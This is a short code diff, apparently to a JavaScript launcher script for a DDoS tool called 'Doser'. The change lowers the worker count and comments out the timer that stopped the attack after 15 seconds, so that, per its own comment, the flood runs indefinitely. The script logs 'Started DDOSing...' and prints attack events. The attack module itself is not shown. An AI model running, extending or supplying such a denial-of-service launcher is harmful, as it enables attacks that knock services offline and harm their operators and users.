@@ -7,17 +7,18 @@ var doser_1 = require("./doser");
 // console.log('Script started: ', args);
 var timeout = undefined;
 function start() {
-    var doser = new doser_1.Doser(true, 32);
+    var doser = new doser_1.Doser(true, 10); //32
     doser.listen('atack', function (data) { return console.log("Attack: ", data.log); });
     doser.listen('error', function (data) { return console.log("Error: ", data.log); });
     // doser.forceProxy(true); // Use proxy to save the server
     // doser.setWorkersCount(32); // Count of workers
     console.log('Started DDOSing...');
     doser.start(); //Start DDOSing
-    //Turn this script off after some time
-    timeout = setTimeout(function () {
-        doser.stop();
-        console.log('Stopped DDOSing...');
-    }, 15000);
+    // Turn this script off after some time
+    // If this is commented out then script will work forever
+    // timeout = setTimeout(() => {
+    //   doser.stop();
+    //   console.log('Stopped DDOSing...')
+    // }, 15000)
 }
 start();
